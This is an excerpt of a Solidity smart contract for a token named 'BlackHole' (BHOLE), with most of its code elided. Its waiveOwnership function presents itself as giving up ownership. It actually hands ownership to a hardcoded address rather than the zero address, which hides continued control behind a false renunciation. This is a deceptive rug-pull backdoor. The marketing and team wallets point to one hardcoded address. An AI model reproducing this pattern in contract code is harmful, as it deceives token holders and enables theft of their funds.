...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xF474E343ef0Cd2306869d89301f613e3516AadAd));
        _owner = address(0xF474E343ef0Cd2306869d89301f613e3516AadAd);
    }
...
contract BlackHole is Context, IERC20, Ownable {
    ...
    string private _name = "BlackHole";
    string private _symbol = "BHOLE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xBBb354C646b01c8f3d48C5604ac3674a60480374);
    address payable public teamWalletAddress = payable(0xBBb354C646b01c8f3d48C5604ac3674a60480374);
